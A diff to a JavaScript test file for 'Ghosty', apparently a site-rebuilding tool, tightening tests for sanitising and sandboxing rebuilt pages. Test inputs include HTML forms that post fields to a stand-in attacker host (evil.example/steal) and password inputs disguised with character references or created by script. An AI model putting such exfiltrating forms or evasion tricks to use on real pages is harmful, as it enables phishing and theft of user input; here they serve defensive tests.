@@ -50,14 +50,16 @@ test('study_site describes the structure, text, images, colours, fonts and scrip
 });
 
 test('a rebuilt page is made safe and phone-ready before it goes live', () => {
-  const { html, notes } = S.prepareSite('<!doctype html><html><head><title>A</title></head><body><img src="x.jpg"><form action="https://evil.example/steal" method="post"><input name="e"></form></body></html>', 'https://acme.example/');
+  const { html, notes } = S.prepareSite('<!doctype html><html><head><title>A</title></head><body><img src="x.jpg"><form action="https://evil.example/steal" method="post"><input name="e"><button formaction="https://evil.example/2">Go</button></form></body></html>', 'https://acme.example/');
   assert.match(html, /name="viewport"/);
   assert.match(html, /<img loading="lazy" decoding="async" src="x.jpg">/);
   assert.match(html, /noindex/);
-  assert.doesNotMatch(html, /evil\.example/);
-  assert.match(html, /Rebuilt by Ghosty from acme\.example · not the official site<\/div><\/body>/);
+  assert.doesNotMatch(html, /evil\.example/, 'form action and formaction removed');
   assert.equal(notes.length, 3);
   assert.throws(() => S.prepareSite('<html><body><input type="password"></body></html>', 'https://bank.example'), /password fields/);
+  assert.throws(() => S.prepareSite('<html><body><input type="pass&#119;ord"></body></html>', ''), /password fields/, 'disguised with a character reference');
+  assert.throws(() => S.prepareSite('<html><body><input type="pass&#x77;ord"></body></html>', ''), /password fields/);
+  assert.throws(() => S.prepareSite("<html><body><script>i.type='password'</script></body></html>", ''), /password fields/, 'made by a script');
   assert.throws(() => S.prepareSite('<div>just a fragment</div>', ''), /ONE complete HTML document/);
   assert.throws(() => S.prepareSite(`<html><body>${'x'.repeat(400_001)}</body></html>`, ''), /too large/);
 });
@@ -95,14 +97,29 @@ test('publish_site puts the page live at a public link that anyone can open, san
   const env = { OWNER_KEY: 'k'.repeat(32), VAULT_KEY: Buffer.from(webcrypto.getRandomValues(new Uint8Array(32))).toString('base64') };
   let agent;
   env.AGENT = { idFromName: () => 'owner', get: () => ({ fetch: (r) => (agent ??= new brain.GhostyAgent(state, env)).fetch(r) }) };
-  const r = await brain.default.fetch(new Request('https://ghosty.example.workers.dev/s/acme-bakery', { headers: { 'sec-fetch-site': 'cross-site' } }), env, { waitUntil() {} });
+  const go = (path, headers = {}) => brain.default.fetch(new Request(`https://ghosty.example.workers.dev${path}`, { headers }), env, { waitUntil() {} });
+  // What a visitor opens: Ghosty's own page, with the bar, framing the rebuilt page.
+  const r = await go('/s/acme-bakery', { 'sec-fetch-site': 'cross-site', 'sec-fetch-dest': 'document' });
   assert.equal(r.status, 200);
-  assert.match(r.headers.get('content-security-policy'), /^sandbox allow-scripts/);
-  assert.doesNotMatch(r.headers.get('content-security-policy'), /allow-same-origin/, "can't reach Ghosty's storage or keys");
+  const wrap = await r.text();
+  assert.match(wrap, /Rebuilt by Ghosty from acme\.example · not the official site/);
+  assert.match(wrap, /<iframe src="\/s\/acme-bakery\/page"[^>]*sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox allow-modals"/);
+  assert.doesNotMatch(wrap, /allow-forms|allow-same-origin/);
+  assert.match(r.headers.get('content-security-policy'), /default-src 'none'.*frame-src 'self'/);
+  assert.doesNotMatch(r.headers.get('content-security-policy'), /script-src/, 'the bar page runs no scripts');
   assert.match(r.headers.get('x-robots-tag'), /noindex/);
-  const body = await r.text();
-  assert.match(body, /<h1>Bread<\/h1>/);
-  assert.match(body, /Rebuilt by Ghosty from acme\.example/);
+  // The rebuilt page, in the frame: locked down by the browser.
+  const f = await go('/s/acme-bakery/page', { 'sec-fetch-dest': 'iframe' });
+  assert.equal(f.status, 200);
+  assert.match(await f.text(), /<h1>Bread<\/h1>/);
+  const csp = f.headers.get('content-security-policy');
+  assert.match(csp, /^sandbox allow-scripts/);
+  for (const rule of ["connect-src 'none'", "form-action 'none'", "script-src 'unsafe-inline'", "frame-ancestors 'self'", "base-uri 'none'"]) assert.ok(csp.includes(rule), rule);
+  assert.doesNotMatch(csp, /allow-same-origin|allow-forms/, "can't reach Ghosty's storage or keys, can't submit forms");
+  // Opened directly, it goes back to the page with the bar.
+  const direct = await go('/s/acme-bakery/page', { 'sec-fetch-dest': 'document' });
+  assert.equal(direct.status, 302);
+  assert.equal(direct.headers.get('location'), '/s/acme-bakery');
   assert.equal((await brain.default.fetch(new Request('https://ghosty.example.workers.dev/s/nope'), env, { waitUntil() {} })).status, 404);
   // the API itself still needs the owner
   assert.equal((await brain.default.fetch(new Request('https://ghosty.example.workers.dev/api/site/acme-bakery'), env, { waitUntil() {} })).status, 401);
